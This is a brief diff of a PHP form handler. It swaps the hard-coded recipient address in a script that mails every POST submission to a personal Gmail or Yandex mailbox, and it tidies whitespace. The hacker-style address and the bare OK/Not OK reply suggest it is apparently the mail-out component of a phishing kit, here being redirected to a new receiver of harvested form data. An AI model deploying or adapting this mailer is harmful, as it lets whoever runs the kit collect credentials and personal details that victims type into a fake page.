@@ -1,5 +1,5 @@
 <?php
-$to = 'omarhack810@gmail.com';
+$to = 'xAlenki@yandex.ru';
 
 function url(){
    return sprintf(
@@ -46,8 +46,7 @@ if($_POST) {
    ini_set("sendmail_from", $to); // for windows server
    $mail = mail($to, $subject, $message, $headers);
 
-	if ($mail) {echo "OK"; }
+   if ($mail) {echo "OK"; }
    else {echo "Not OK"; }
 }
-
 ?>
